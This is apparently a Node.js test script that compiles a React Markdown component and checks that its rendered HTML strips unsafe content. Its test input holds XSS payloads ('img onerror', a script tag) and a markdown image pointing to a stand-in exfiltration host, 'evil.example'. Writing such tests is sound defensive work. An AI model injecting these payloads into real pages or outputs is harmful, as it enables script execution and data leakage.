import { execFileSync } from "node:child_process";
import { copyFileSync, mkdtempSync, rmSync } from "node:fs";
import { join, resolve } from "node:path";
import { createRequire } from "node:module";

const web = resolve(import.meta.dirname, "..");
const out = mkdtempSync(join(web, ".markdown-test-"));
const tsc = join(web, "node_modules", "typescript", "bin", "tsc");

try {
  execFileSync(
    process.execPath,
    [
      tsc,
      "src/components/Markdown.tsx",
      "--ignoreConfig",
      "--jsx",
      "react-jsx",
      "--module",
      "commonjs",
      "--target",
      "es2022",
      "--skipLibCheck",
      "--outDir",
      out,
    ],
    { cwd: web, stdio: "pipe" },
  );
  const compiled = join(out, "Markdown.js");
  const commonjs = join(out, "Markdown.cjs");
  copyFileSync(compiled, commonjs);
  const require = createRequire(import.meta.url);
  const React = require("react");
  const { renderToStaticMarkup } = require("react-dom/server");
  const { Markdown } = require(commonjs);

  const html = renderToStaticMarkup(
    React.createElement(Markdown, {
      text:
        '![x](https://evil.example/?q=data) <img src=x onerror=alert(1)> ' +
        "<script>alert(1)</script> [click](https://example.com/path)",
    }),
  );

  const failures = [];
  if (html.includes("<img")) failures.push("rendered an img element");
  if (html.includes("<script")) failures.push("rendered a script element");
  if (html.includes('href="https://evil.example/?q=data"'))
    failures.push("turned an image marker into a link");
  if (!html.includes('href="https://example.com/path"'))
    failures.push("dropped a safe http link");
  if (!html.includes("example.com"))
    failures.push("did not show the link host");

  if (failures.length > 0) {
    console.error(failures.join("\n"));
    process.exitCode = 1;
  } else {
    console.log("markdown safety checks passed");
  }
} finally {
  rmSync(out, { recursive: true, force: true });
}
